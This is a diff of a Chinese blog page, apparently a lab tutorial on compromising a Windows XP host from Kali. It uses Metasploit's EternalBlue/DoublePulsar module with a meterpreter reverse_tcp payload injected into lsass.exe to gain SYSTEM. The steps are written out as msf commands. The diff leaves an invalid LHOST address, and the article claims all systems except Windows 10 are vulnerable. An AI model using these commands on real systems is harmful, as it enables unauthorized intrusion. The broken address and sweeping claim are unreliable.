@@ -292,8 +292,8 @@
       <div class="article-entry" itemprop="articleBody">
         <hr>
 <p>通过双脉冲星学习msf对渗透的利用：（除win10以外的系统均可攻击）</p>
-<p>​    靶机：Windows xp（192.168.124.15）</p>
-<p>​    攻击机：Kali （192.168.124.105）</p>
+<p>​    靶机：Windows xp（192.168.124.108）</p>
+<p>​    攻击机：Kali （192.168.124.106）</p>
 <p>1.使用-p-对靶机进行扫描，查看有哪些端口漏洞(08_067对应的漏洞端口为445)</p>
 <p><img src="https://img.vim-cn.com/35/9f86370c1ecd0a4c69d7fcc4077b5040b9fd9f.png" alt="0"></p>
 <p>2.将模块复制到msf目录下</p>
@@ -302,12 +302,14 @@
 <p><img src="https://img.vim-cn.com/af/e592e20e35b916d5ea2824b879d968a6c998ea.png" alt="2"></p>
 <p>4.利用漏洞模块，设置参数</p>
 <p>msf &gt; use exploit/windows/smb/eternalblue_doublepulsar</p>
-<p>msf &gt; set RHOST 192.168.124.15</p>
+<p>msf &gt; set RHOST 192.168.124.108</p>
 <p>msf &gt; set payload windows/meterpreter/reverse_tcp</p>
-<p>msf &gt; set LHOST 192.168.124.105</p>
+<p>msf &gt; set LHOST 192.168.124.1006</p>
 <p>msf &gt; set DOUBLEPULSARPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p>
 <p>msf &gt; set ETERNALBLUEPATH /usr/share/metasploit-framework/modules/exploits/windows/smb/deps</p>
 <p>msf &gt; set PROCESSINJECT lsass.exe</p>
+<p><img src="https://img.vim-cn.com/39/e8d2ff9ef700954b9577f0479de861e2cea686.png" alt="6"></p>
+<p>可以看到漏洞利用成功，现在是 system 最高权限,就可以对靶机进行为所欲为了</p>
 
       </div>
       
@@ -320,10 +322,10 @@
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-12-06T14:21:28+08:00">
+          <div class="new-meta-item date" itemprop="dateUpdated" datetime="2019-12-07T09:30:23+08:00">
   <a class='notlink'>
     <i class="fas fa-clock" aria-hidden="true"></i>
-    <p>更新于 2019年12月6日</p>
+    <p>更新于 2019年12月7日</p>
   </a>
 </div>
 
@@ -349,6 +351,25 @@
       
       
           <div class="prev-next">
+              
+                  <section class="prev">
+                      <span class="art-item-left">
+                          <h6><i class="fas fa-chevron-left" aria-hidden="true"></i>&nbsp;上一页</h6>
+                          <h4>
+                              <a href="/2019/12/07/Linux%E9%80%9A%E8%BF%87smb%E6%9C%8D%E5%8A%A1%E6%B8%97%E9%80%8F/" rel="prev" title="Linux通过smb服务渗透">
+                                
+                                    Linux通过smb服务渗透
+                                
+                              </a>
+                          </h4>
+                          
+                              
+                              <h6 class="tags">
+                                  <a class="tag" href="/tags/%E6%B8%97%E9%80%8F/"><i class="fas fa-tag fa-fw" aria-hidden="true"></i> 渗透</a>
+                              </h6>
+                          
+                      </span>
+                  </section>
               
               
                   <section class="next">
